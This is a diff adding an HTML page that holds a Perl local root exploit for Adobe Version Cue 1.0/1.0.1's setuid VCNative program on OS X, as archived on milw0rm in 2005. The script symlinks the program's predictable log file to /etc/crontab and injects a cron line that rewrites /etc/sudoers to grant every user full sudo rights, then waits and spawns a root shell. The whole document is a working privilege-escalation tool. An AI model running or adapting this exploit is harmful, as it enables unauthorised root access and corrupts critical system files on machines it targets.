@@ -1,0 +1,75 @@
+<html>
+<head>
+<title>Adobe Version Cue 1.0/1.0.1 Local Root Exploit (OSX)</title>
+<pre>
+#!/usr/bin/perl
+#
+# Adobe Version Cue VCNative[OSX]: local root exploit.
+# 
+# by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)
+# 
+# Adobe Version Cue's VCNative program writes data to a log file in
+# the current working directory while running as (setuid) root. the
+# logfile is formated as &lt;cwd&gt;/VCNative-&lt;pid&gt;.log, which is easily
+# predictable. you may link this file to any file on the system
+# and overwrite its contents. use of the &quot;-host&quot; option (with
+# &quot;-port&quot;) will allow user-supplied data to be injected into the
+# file.
+#
+# This exploit works by overwriting /etc/crontab with
+# '* * * * * root echo &quot;ALL ALL=(ALL) ALL&quot;&gt;/etc/sudoers' and
+# log garbage. within a short period of time crontab will overwrite
+# /etc/sudoers and &quot;sudo sh&quot; to root is possible. this method is used
+# because direct overwriting of /etc/sudoers will cause sudo to exit
+# with configuration errors due to the log garbage, whereas crontab
+# will ignore it. (this exploit requires both cron to be running and
+# sudo to exist--this is generally default osx)
+
+use POSIX;
+
+$vcn_path=&quot;/Applications/Adobe Version Cue/tomcat/webapps/ROOT/&quot; .
+&quot;WEB-INF/components/com.adobe.bauhaus.nativecomm/res/VCNative&quot;;
+$vcn_pid=($$ + 1);
+$vcn_cwd=&quot;/tmp&quot;;
+$vcn_tempfile=&quot;$vcn_cwd/VCNative-$vcn_pid\.log&quot;;
+$ovrfile=&quot;/etc/crontab&quot;;
+$ovrstr=&quot;* * * * * root echo \\\&quot;ALL ALL=(ALL) ALL\\\&quot;&gt;/etc/sudoers&quot;;
+
+sub pexit{print(&quot;[!] @_.\n&quot;);exit(1);}
+print(&quot;[*] Adobe Version Cue VCNative[OSX]: local root exploit.\n&quot;);
+print(&quot;[*] by: vade79/v9 v9\@fakehalo.us (fakehalo/realhalo)\n\n&quot;);
+if(!-f $vcn_path){
+pexit(&quot;VCNative binary doesn't appear to exist&quot;);
+}
+if(!-f&quot;/etc/crontab&quot;||!-f&quot;/etc/sudoers&quot;){
+pexit(&quot;/etc/crontab and /etc/sudoers are required for this to work&quot;);
+}
+print(&quot;[*] sym-linking $ovrfile -&gt; $vcn_tempfile.\n&quot;);
+symlink($ovrfile,$vcn_tempfile)||pexit(&quot;couldn't link files.&quot;);
+@ast=stat($ovrfile);
+print(&quot;[*] running VCNative...\n&quot;);
+system(&quot;\&quot;$vcn_path\&quot; -cwd $vcn_cwd -port 1 -host \&quot;\n\n$ovrstr\n\n\&quot;&quot;);
+print(&quot;[*] removing $vcn_tempfile...\n&quot;);
+unlink($vcn_tempfile);
+@st=stat($ovrfile);
+if($st[7]==$ast[7]&amp;&amp;$st[9]==$ast[9]){
+pexit(&quot;$ovrfile was not modified, exploit failed&quot;);
+}
+else{
+print(&quot;[*] $ovrfile was overwritten successfully...\n&quot;);
+}
+print(&quot;[*] waiting for crontab to change /etc/sudoers...\n&quot;);
+@ast=@st=stat(&quot;/etc/sudoers&quot;);
+while($st[7]==$ast[7]&amp;&amp;$st[9]==$ast[9]){
+sleep(1);
+@ast=stat(&quot;/etc/sudoers&quot;);
+}
+print(&quot;[*] /etc/sudoers has been modified.\n&quot;);
+print(&quot;[*] attempting to \&quot;sudo sh\&quot;. (use YOUR password)\n&quot;);
+system(&quot;sudo sh&quot;);
+exit(0);
+
+# milw0rm.com [2005-08-30]
+</pre>
+</html>
+
